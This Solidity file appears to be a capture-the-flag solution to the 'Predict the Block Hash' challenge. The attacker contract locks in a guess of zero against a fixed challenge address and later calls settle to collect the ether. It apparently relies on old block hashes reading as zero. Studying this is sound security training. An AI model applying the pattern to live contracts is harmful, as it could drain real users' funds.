//SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheBlockHashChallenge {
    address public owner;
    IPredictTheBlockHashChallenge public challenge = IPredictTheBlockHashChallenge(0x9C9d0DBB616926856c3768D945d6138448A081F0);

    constructor() {
        owner = msg.sender;
    }

    function lockInGuess() public payable {
      require(msg.sender == owner, "Only the owner can solve this challenge");
      require(msg.value == 1 ether, "You must send 1 ether");

      challenge.lockInGuess{value: 1 ether}(0);
    }

    function settle() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");

        challenge.settle();

        if (challenge.isComplete()) {
          payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
